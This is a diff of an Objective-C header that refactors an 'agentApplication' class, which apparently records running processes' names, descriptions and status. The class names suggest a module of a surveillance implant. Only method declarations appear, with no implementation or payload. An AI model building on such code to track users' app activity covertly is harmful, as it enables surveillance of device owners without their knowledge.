@@ -8,37 +8,19 @@
 
 #import <Foundation/Foundation.h>
 
-//typedef __appStruct {
-//  struct tm timestamp;
-//  char *name;
-//  char *status;
-//  char *desc;
-//  char *delim;
-//} appStruct;
+#import "RCSIAgent.h"
 
-@interface RCSIAgentApplication : NSObject 
+@interface agentApplication : RCSIAgent
 {
   BOOL      isAppStarted;
   NSString *mProcessName;
   NSString *mProcessDesc;
-@private
-  NSMutableDictionary *mAgentConfiguration;
 }
 
-@property (readwrite) BOOL isAppStarted;
-
-+ (RCSIAgentApplication *)sharedInstance;
-+ (id)allocWithZone: (NSZone *)aZone;
-- (id)copyWithZone: (NSZone *)aZone;
-- (id)retain;
-- (unsigned)retainCount;
-- (void)release;
-- (id)autorelease;
 - (BOOL)writeProcessInfoWithStatus: (NSString*)aStatus;
 - (BOOL)grabInfo: (NSString*)aStatus;
-- (void)sendStopLog;
-- (void)sendStartLog;
-- (void)start;
-- (BOOL)stop;
+
+- (BOOL)start;
+- (void)stop;
 
 @end
